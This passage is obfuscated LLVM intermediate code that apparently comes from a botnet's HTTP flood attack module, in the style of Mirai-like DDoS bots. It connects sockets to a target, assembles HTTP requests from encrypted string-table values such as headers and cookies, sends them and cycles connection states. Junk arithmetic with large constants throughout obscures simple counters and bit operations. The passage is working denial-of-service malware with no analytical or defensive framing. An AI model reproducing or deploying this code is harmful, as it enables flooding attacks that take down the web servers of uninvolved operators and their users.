  store i16 %461, i16* %462, align 2
  %463 = load i32, i32* %27, align 4
  %464 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %465 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %464, i32 0, i32 2
  store i32 %463, i32* %465, align 4
  %466 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %466, i32 0, i32 1
  store i8 2, i8* %467, align 4
  %468 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %469 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 4
  %471 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %472 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %472, %struct.sockaddr** %471, align 8
  %473 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %474 = load %struct.sockaddr*, %struct.sockaddr** %473, align 8
  %475 = call i32 @connect(i32 %470, %struct.sockaddr* %474, i32 16)
  %476 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %477 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %476, i32 0, i32 0
  %478 = load i32, i32* %477, align 4
  %479 = srem i32 %478, 64
  %480 = zext i32 %479 to i64
  %481 = shl i64 1, %480
  %482 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %483, i32 0, i32 0
  %485 = load i32, i32* %484, align 4
  %486 = sdiv i32 %485, 64
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds [16 x i64], [16 x i64]* %482, i64 0, i64 %487
  %489 = load i64, i64* %488, align 8
  %490 = xor i64 %489, -1
  %491 = xor i64 %481, -1
  %492 = xor i64 7344074826455030513, -1
  %493 = and i64 %490, 7344074826455030513
  %494 = and i64 %489, %492
  %495 = and i64 %491, 7344074826455030513
  %496 = and i64 %481, %492
  %497 = or i64 %493, %494
  %498 = or i64 %495, %496
  %499 = xor i64 %497, %498
  %500 = or i64 %490, %491
  %501 = xor i64 %500, -1
  %502 = or i64 7344074826455030513, %492
  %503 = and i64 %501, %502
  %504 = or i64 %499, %503
  %505 = or i64 %489, %481
  store i64 %504, i64* %488, align 8
  %506 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %507 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %506, i32 0, i32 0
  %508 = load i32, i32* %507, align 4
  %509 = load i32, i32* %23, align 4
  %510 = icmp sgt i32 %508, %509
  br i1 %510, label %511, label %519

; <label>:511:                                    ; preds = %436
  %512 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %513 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %512, i32 0, i32 0
  %514 = load i32, i32* %513, align 4
  %515 = add i32 %514, 198306047
  %516 = add i32 %515, 1
  %517 = sub i32 %516, 198306047
  %518 = add nsw i32 %514, 1
  store i32 %517, i32* %23, align 4
  br label %519

; <label>:519:                                    ; preds = %511, %436
  br label %1039

; <label>:520:                                    ; preds = %413
  %521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %521, i32 0, i32 1
  %523 = load i8, i8* %522, align 4
  %524 = zext i8 %523 to i32
  %525 = icmp eq i32 %524, 2
  br i1 %525, label %526, label %590

; <label>:526:                                    ; preds = %520
  %527 = load i32, i32* %27, align 4
  %528 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %529 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %528, i32 0, i32 2
  %530 = load i32, i32* %529, align 4
  %531 = sub i32 0, %530
  %532 = add i32 %527, %531
  %533 = sub i32 %527, %530
  %534 = icmp ugt i32 %532, 30
  br i1 %534, label %535, label %544

; <label>:535:                                    ; preds = %526
  %536 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %537 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %536, i32 0, i32 1
  store i8 0, i8* %537, align 4
  %538 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %539 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %538, i32 0, i32 0
  %540 = load i32, i32* %539, align 4
  %541 = call i32 @close(i32 %540)
  %542 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %542, i32 0, i32 0
  store i32 -1, i32* %543, align 4
  br label %1040

; <label>:544:                                    ; preds = %526
  %545 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %545, i32 0, i32 0
  %547 = load i32, i32* %546, align 4
  %548 = srem i32 %547, 64
  %549 = zext i32 %548 to i64
  %550 = shl i64 1, %549
  %551 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %552 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %553 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %552, i32 0, i32 0
  %554 = load i32, i32* %553, align 4
  %555 = sdiv i32 %554, 64
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds [16 x i64], [16 x i64]* %551, i64 0, i64 %556
  %558 = load i64, i64* %557, align 8
  %559 = xor i64 %558, -1
  %560 = xor i64 %550, -1
  %561 = xor i64 4323923176358121668, -1
  %562 = and i64 %559, 4323923176358121668
  %563 = and i64 %558, %561
  %564 = and i64 %560, 4323923176358121668
  %565 = and i64 %550, %561
  %566 = or i64 %562, %563
  %567 = or i64 %564, %565
  %568 = xor i64 %566, %567
  %569 = or i64 %559, %560
  %570 = xor i64 %569, -1
  %571 = or i64 4323923176358121668, %561
  %572 = and i64 %570, %571
  %573 = or i64 %568, %572
  %574 = or i64 %558, %550
  store i64 %573, i64* %557, align 8
  %575 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %575, i32 0, i32 0
  %577 = load i32, i32* %576, align 4
  %578 = load i32, i32* %23, align 4
  %579 = icmp sgt i32 %577, %578
  br i1 %579, label %580, label %589

; <label>:580:                                    ; preds = %544
  %581 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %582 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %581, i32 0, i32 0
  %583 = load i32, i32* %582, align 4
  %584 = sub i32 0, %583
  %585 = sub i32 0, 1
  %586 = add i32 %584, %585
  %587 = sub i32 0, %586
  %588 = add nsw i32 %583, 1
  store i32 %587, i32* %23, align 4
  br label %589

; <label>:589:                                    ; preds = %580, %544
  br label %1038

; <label>:590:                                    ; preds = %520
  %591 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %592 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %591, i32 0, i32 1
  %593 = load i8, i8* %592, align 4
  %594 = zext i8 %593 to i32
  %595 = icmp eq i32 %594, 4
  br i1 %595, label %596, label %878

; <label>:596:                                    ; preds = %590
  %597 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %598 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %597, i32 0, i32 14
  store i32 -1, i32* %598, align 4
  %599 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %600 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %599, i32 0, i32 11
  store i32 0, i32* %600, align 4
  %601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %601, i32 0, i32 18
  %603 = getelementptr inbounds [1024 x i8], [1024 x i8]* %602, i32 0, i32 0
  call void @util_zero(i8* %603, i32 1024)
  %604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %604, i32 0, i32 17
  store i32 0, i32* %605, align 4
  %606 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %606, i32 10240)
  %607 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %608 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %609 = call i32 @util_strlen(i8* %608)
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds i8, i8* %607, i64 %610
  %612 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %613 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %612, i32 0, i32 9
  %614 = getelementptr inbounds [9 x i8], [9 x i8]* %613, i32 0, i32 0
  %615 = call i32 @util_strcpy(i8* %611, i8* %614)
  %616 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %617 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %618 = call i32 @util_strlen(i8* %617)
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds i8, i8* %616, i64 %619
  %621 = call i32 @util_strcpy(i8* %620, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %622 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %623 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %624 = call i32 @util_strlen(i8* %623)
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds i8, i8* %622, i64 %625
  %627 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %628 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %627, i32 0, i32 6
  %629 = getelementptr inbounds [257 x i8], [257 x i8]* %628, i32 0, i32 0
  %630 = call i32 @util_strcpy(i8* %626, i8* %629)
  %631 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %632 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %633 = call i32 @util_strlen(i8* %632)
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds i8, i8* %631, i64 %634
  %636 = call i32 @util_strcpy(i8* %635, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %637 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %638 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %639 = call i32 @util_strlen(i8* %638)
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds i8, i8* %637, i64 %640
  %642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %642, i32 0, i32 5
  %644 = getelementptr inbounds [512 x i8], [512 x i8]* %643, i32 0, i32 0
  %645 = call i32 @util_strcpy(i8* %641, i8* %644)
  %646 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %647 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %648 = call i32 @util_strlen(i8* %647)
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds i8, i8* %646, i64 %649
  %651 = call i32 @util_strcpy(i8* %650, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %652 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %653 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %654 = call i32 @util_strlen(i8* %653)
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds i8, i8* %652, i64 %655
  %657 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %658 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %657, i32 0, i32 7
  %659 = getelementptr inbounds [129 x i8], [129 x i8]* %658, i32 0, i32 0
  %660 = call i32 @util_strcpy(i8* %656, i8* %659)
  %661 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %662 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %663 = call i32 @util_strlen(i8* %662)
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds i8, i8* %661, i64 %664
  %666 = call i32 @util_strcpy(i8* %665, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %667 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %668 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %669 = call i32 @util_strlen(i8* %668)
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds i8, i8* %667, i64 %670
  %672 = call i8* @table_retrieve_val(i32 39, i32* null)
  %673 = call i32 @util_strcpy(i8* %671, i8* %672)
  call void @table_lock_val(i8 zeroext 39)
  %674 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %675 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %676 = call i32 @util_strlen(i8* %675)
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds i8, i8* %674, i64 %677
  %679 = call i32 @util_strcpy(i8* %678, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %680 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %681 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %682 = call i32 @util_strlen(i8* %681)
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds i8, i8* %680, i64 %683
  %685 = call i8* @table_retrieve_val(i32 40, i32* null)
  %686 = call i32 @util_strcpy(i8* %684, i8* %685)
  call void @table_lock_val(i8 zeroext 40)
  %687 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %688 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %689 = call i32 @util_strlen(i8* %688)
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8, i8* %687, i64 %690
  %692 = call i32 @util_strcpy(i8* %691, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %693 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %694 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %695 = call i32 @util_strlen(i8* %694)
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds i8, i8* %693, i64 %696
  %698 = call i8* @table_retrieve_val(i32 41, i32* null)
  %699 = call i32 @util_strcpy(i8* %697, i8* %698)
  call void @table_lock_val(i8 zeroext 41)
  %700 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %701 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %702 = call i32 @util_strlen(i8* %701)
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds i8, i8* %700, i64 %703
  %705 = call i32 @util_strcpy(i8* %704, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %706 = load i8*, i8** %14, align 8
  %707 = icmp ne i8* %706, null
  br i1 %707, label %708, label %749

; <label>:708:                                    ; preds = %596
  call void @table_unlock_val(i8 zeroext 42)
  %709 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %710 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %711 = call i32 @util_strlen(i8* %710)
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds i8, i8* %709, i64 %712
  %714 = call i8* @table_retrieve_val(i32 42, i32* null)
  %715 = call i32 @util_strcpy(i8* %713, i8* %714)
  call void @table_lock_val(i8 zeroext 42)
  %716 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %717 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %718 = call i32 @util_strlen(i8* %717)
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds i8, i8* %716, i64 %719
  %721 = call i32 @util_strcpy(i8* %720, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %722 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %723 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %724 = call i32 @util_strlen(i8* %723)
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds i8, i8* %722, i64 %725
  %727 = call i8* @table_retrieve_val(i32 47, i32* null)
  %728 = call i32 @util_strcpy(i8* %726, i8* %727)
  %729 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %730 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %731 = call i32 @util_strlen(i8* %730)
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds i8, i8* %729, i64 %732
  %734 = call i32 @util_strcpy(i8* %733, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %735 = load i8*, i8** %14, align 8
  %736 = call i32 @util_strlen(i8* %735)
  %737 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %738 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %739 = call i32 @util_strlen(i8* %738)
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds i8, i8* %737, i64 %740
  %742 = call i8* @util_itoa(i32 %736, i32 10, i8* %741)
  %743 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %744 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %745 = call i32 @util_strlen(i8* %744)
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds i8, i8* %743, i64 %746
  %748 = call i32 @util_strcpy(i8* %747, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %749

; <label>:749:                                    ; preds = %708, %596
  %750 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %751 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %750, i32 0, i32 15
  %752 = load i32, i32* %751, align 4
  %753 = icmp sgt i32 %752, 0
  br i1 %753, label %754, label %799

; <label>:754:                                    ; preds = %749
  %755 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = call i32 @util_strlen(i8* %756)
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds i8, i8* %755, i64 %758
  %760 = call i32 @util_strcpy(i8* %759, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %761

; <label>:761:                                    ; preds = %786, %754
  %762 = load i32, i32* %10, align 4
  %763 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %764 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %763, i32 0, i32 15
  %765 = load i32, i32* %764, align 4
  %766 = icmp slt i32 %762, %765
  br i1 %766, label %767, label %792

; <label>:767:                                    ; preds = %761
  %768 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %769 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %770 = call i32 @util_strlen(i8* %769)
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds i8, i8* %768, i64 %771
  %773 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %774 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %773, i32 0, i32 16
  %775 = load i32, i32* %10, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %774, i64 0, i64 %776
  %778 = getelementptr inbounds [128 x i8], [128 x i8]* %777, i32 0, i32 0
  %779 = call i32 @util_strcpy(i8* %772, i8* %778)
  %780 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %781 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %782 = call i32 @util_strlen(i8* %781)
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds i8, i8* %780, i64 %783
  %785 = call i32 @util_strcpy(i8* %784, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %786

; <label>:786:                                    ; preds = %767
  %787 = load i32, i32* %10, align 4
  %788 = add i32 %787, 220851299
  %789 = add i32 %788, 1
  %790 = sub i32 %789, 220851299
  %791 = add nsw i32 %787, 1
  store i32 %790, i32* %10, align 4
  br label %761

; <label>:792:                                    ; preds = %761
  %793 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %794 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %795 = call i32 @util_strlen(i8* %794)
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds i8, i8* %793, i64 %796
  %798 = call i32 @util_strcpy(i8* %797, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %799

; <label>:799:                                    ; preds = %792, %749
  %800 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %801 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %802 = call i32 @util_strlen(i8* %801)
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds i8, i8* %800, i64 %803
  %805 = call i32 @util_strcpy(i8* %804, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %806 = load i8*, i8** %14, align 8
  %807 = icmp ne i8* %806, null
  br i1 %807, label %808, label %816

; <label>:808:                                    ; preds = %799
  %809 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %810 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %811 = call i32 @util_strlen(i8* %810)
  %812 = sext i32 %811 to i64
  %813 = getelementptr inbounds i8, i8* %809, i64 %812
  %814 = load i8*, i8** %14, align 8
  %815 = call i32 @util_strcpy(i8* %813, i8* %814)
  br label %816

; <label>:816:                                    ; preds = %808, %799
  %817 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %818 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %817, i32 0, i32 9
  %819 = getelementptr inbounds [9 x i8], [9 x i8]* %818, i32 0, i32 0
  %820 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %821 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %820, i32 0, i32 10
  %822 = getelementptr inbounds [9 x i8], [9 x i8]* %821, i32 0, i32 0
  %823 = call signext i8 @util_strcmp(i8* %819, i8* %822)
  %824 = icmp ne i8 %823, 0
  br i1 %824, label %833, label %825

; <label>:825:                                    ; preds = %816
  %826 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %827 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %826, i32 0, i32 9
  %828 = getelementptr inbounds [9 x i8], [9 x i8]* %827, i32 0, i32 0
  %829 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %830 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %829, i32 0, i32 10
  %831 = getelementptr inbounds [9 x i8], [9 x i8]* %830, i32 0, i32 0
  %832 = call i32 @util_strcpy(i8* %828, i8* %831)
  br label %833

; <label>:833:                                    ; preds = %825, %816
  %834 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %835 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %834, i32 0, i32 0
  %836 = load i32, i32* %835, align 4
  %837 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %838 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %839 = call i32 @util_strlen(i8* %838)
  %840 = sext i32 %839 to i64
  %841 = call i64 @send(i32 %836, i8* %837, i64 %840, i32 16384)
  %842 = load i32, i32* %27, align 4
  %843 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %844 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %843, i32 0, i32 3
  store i32 %842, i32* %844, align 4
  %845 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %846 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %845, i32 0, i32 1
  store i8 6, i8* %846, align 4
  %847 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %847, i32 0, i32 0
  %849 = load i32, i32* %848, align 4
  %850 = srem i32 %849, 64
  %851 = zext i32 %850 to i64
  %852 = shl i64 1, %851
  %853 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %854 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %855 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %854, i32 0, i32 0
  %856 = load i32, i32* %855, align 4
  %857 = sdiv i32 %856, 64
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds [16 x i64], [16 x i64]* %853, i64 0, i64 %858
  %860 = load i64, i64* %859, align 8
  %861 = and i64 %860, %852
  %862 = xor i64 %860, %852
  %863 = or i64 %861, %862
  %864 = or i64 %860, %852
  store i64 %863, i64* %859, align 8
  %865 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %865, i32 0, i32 0
  %867 = load i32, i32* %866, align 4
  %868 = load i32, i32* %23, align 4
  %869 = icmp sgt i32 %867, %868
  br i1 %869, label %870, label %877

; <label>:870:                                    ; preds = %833
  %871 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %872 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %871, i32 0, i32 0
  %873 = load i32, i32* %872, align 4
  %874 = sub i32 0, 1
  %875 = sub i32 %873, %874
  %876 = add nsw i32 %873, 1
  store i32 %875, i32* %23, align 4
  br label %877

; <label>:877:                                    ; preds = %870, %833
  br label %1037

; <label>:878:                                    ; preds = %590
  %879 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %880 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %879, i32 0, i32 1
  %881 = load i8, i8* %880, align 4
  %882 = zext i8 %881 to i32
  %883 = icmp eq i32 %882, 6
  br i1 %883, label %884, label %917

; <label>:884:                                    ; preds = %878
  %885 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %885, i32 0, i32 0
  %887 = load i32, i32* %886, align 4
  %888 = srem i32 %887, 64
  %889 = zext i32 %888 to i64
  %890 = shl i64 1, %889
  %891 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %892 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %893 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %892, i32 0, i32 0
  %894 = load i32, i32* %893, align 4
  %895 = sdiv i32 %894, 64
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds [16 x i64], [16 x i64]* %891, i64 0, i64 %896
  %898 = load i64, i64* %897, align 8
  %899 = and i64 %898, %890
  %900 = xor i64 %898, %890
  %901 = or i64 %899, %900
  %902 = or i64 %898, %890
  store i64 %901, i64* %897, align 8
  %903 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %904 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %903, i32 0, i32 0
  %905 = load i32, i32* %904, align 4
  %906 = load i32, i32* %23, align 4
  %907 = icmp sgt i32 %905, %906
  br i1 %907, label %908, label %916

; <label>:908:                                    ; preds = %884
  %909 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %910 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %909, i32 0, i32 0
  %911 = load i32, i32* %910, align 4
  %912 = sub i32 %911, -1941128897
  %913 = add i32 %912, 1
  %914 = add i32 %913, -1941128897
  %915 = add nsw i32 %911, 1
  store i32 %914, i32* %23, align 4
  br label %916

; <label>:916:                                    ; preds = %908, %884
  br label %1036

; <label>:917:                                    ; preds = %878
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 1
  %920 = load i8, i8* %919, align 4
  %921 = zext i8 %920 to i32
  %922 = icmp eq i32 %921, 7
  br i1 %922, label %923, label %957

; <label>:923:                                    ; preds = %917
  %924 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %925 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %924, i32 0, i32 0
  %926 = load i32, i32* %925, align 4
  %927 = srem i32 %926, 64
  %928 = zext i32 %927 to i64
  %929 = shl i64 1, %928
  %930 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
